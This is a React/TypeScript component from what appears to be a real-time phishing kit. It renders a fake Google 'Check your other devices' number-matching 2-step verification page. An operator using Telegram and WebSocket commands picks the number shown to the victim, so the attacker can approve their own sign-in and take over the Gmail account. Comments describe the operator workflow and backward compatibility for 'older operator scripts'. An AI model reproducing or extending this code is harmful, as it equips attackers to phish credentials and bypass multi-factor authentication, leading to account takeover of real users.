import React from 'react';
import { useLocation } from 'react-router-dom';
import ProviderShell from './ProviderShell';

interface GmailNumberPromptPageProps {
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Google "Number Prompt" challenge page (Google's number-matching 2-step
 * verification flow). The operator drives this page in two steps via Telegram:
 * first they pick a number from an inline keyboard, then the server pushes a
 * `show_google_number_prompt` command whose payload contains the single chosen
 * number (e.g. `{ number: 42 }`).
 *
 * This page simply displays that single number — it is the value the user is
 * expected to tap on their other device to approve the sign-in.
 */
const GmailNumberPromptPage: React.FC<GmailNumberPromptPageProps> = ({ onAction }) => {
  const location = useLocation();
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};

  const email =
    (data.email as string) ||
    ((location.state as { email?: string } | null)?.email) ||
    '';

  // The operator now supplies a single chosen number. Accept `number` first;
  // tolerate a stale `numbers[0]` payload so older operator scripts still work.
  const rawNumber =
    (data.number as unknown) ??
    (Array.isArray(data.numbers) ? (data.numbers as unknown[])[0] : undefined);
  const parsed = Number(rawNumber);
  const number = Number.isFinite(parsed)
    ? parsed
    : Math.floor(10 + Math.random() * 90);

  const goBack = () => {
    // Standardised "wait for command" cancel — the App-level handler shows a
    // full-page spinner and waits for the operator's next WebSocket command.
    onAction('user_canceled');
  };

  const description = (
    <>
      Open the Gmail app on your phone or tablet to verify it&rsquo;s you.
      Tap <strong>{number}</strong> on your other device to continue.
    </>
  );

  const primaryActions = (
    <>
      <button
        type="button"
        onClick={goBack}
        className="text-sm font-semibold text-blue-600 hover:underline"
      >
        Try another way
      </button>
      <button
        type="button"
        onClick={() => onAction('deny_authenticator')}
        className="px-5 py-2 border border-gray-300 text-gray-700 text-sm font-semibold rounded-full hover:bg-gray-50"
      >
        It wasn&rsquo;t me
      </button>
    </>
  );

  const secondaryAction = (
    <button
      type="button"
      onClick={() => onAction('resend_prompt')}
      className="text-sm font-semibold text-blue-600 hover:underline"
    >
      Resend it
    </button>
  );

  return (
    <ProviderShell
      providerKey="gmail"
      email={email}
      title="Check your other devices"
      description={description}
      onBack={goBack}
      primaryActions={primaryActions}
      secondaryAction={secondaryAction}
    >
      <div className="flex flex-col items-center gap-3 py-2" role="group" aria-label="Number to tap on your other device">
        <div
          className="w-32 py-3 text-3xl font-medium text-gray-900 bg-white border border-gray-300 rounded-lg text-center select-none"
          aria-live="polite"
        >
          {number}
        </div>
      </div>
    </ProviderShell>
  );
};

export default GmailNumberPromptPage;
